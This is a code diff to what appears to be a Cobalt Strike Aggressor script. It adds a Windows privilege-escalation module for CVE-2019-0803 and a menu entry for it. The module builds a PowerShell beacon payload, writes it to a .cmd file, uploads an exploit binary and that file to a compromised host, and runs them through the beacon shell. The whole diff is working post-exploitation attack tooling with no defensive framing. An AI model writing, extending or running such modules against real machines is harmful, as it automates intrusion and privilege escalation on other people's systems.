@@ -129,6 +129,18 @@ sub SweetPotato {
 	beacon_link($bid, $null, $3['listener']);
 }
 
+sub cve_2019_0803{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via cve-2019-0803");
+    local('$payload $fname');
+    $fname = Getname().".cmd";
+    $payload = powershell($3['listener'], false);
+    $handle = openf("> $+ $fname");
+    writeb($handle, $payload);
+    closef($handle);
+    bupload!($bid, script_resource("exp/0803.exe"));
+    bupload!($bid, $fname);
+    bshell!($bid,"0803.exe cmd  $+ \"$fname\"");
+}
 #append menus
 
 
@@ -192,6 +204,15 @@ sub SweetPotato {
             $bid = $1['@'];
             $Dialog = dialog("CVE-2019-1405/1322",%(bid => $bid),&CVE_2019_1405_1322);
             dialog_description($Dialog, "An elevation of privilege vulnerability exists when Windows improperly handles authentication requests");
+            drow_listener($Dialog, "listener", "Listener: ");
+            dbutton_action($Dialog, "Exploit");
+            dialog_show($Dialog);
+        }
+
+        item "CVE-2019-0803"{
+            $bid = $1['@'];
+            $Dialog = dialog("CVE-2019-0803",%(bid => $bid),&cve_2019_0803);
+            dialog_description($Dialog, "The elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory, aka 'Win32k Elevation of Privilege Vulnerability'.");
             drow_listener($Dialog, "listener", "Listener: ");
             dbutton_action($Dialog, "Exploit");
             dialog_show($Dialog);
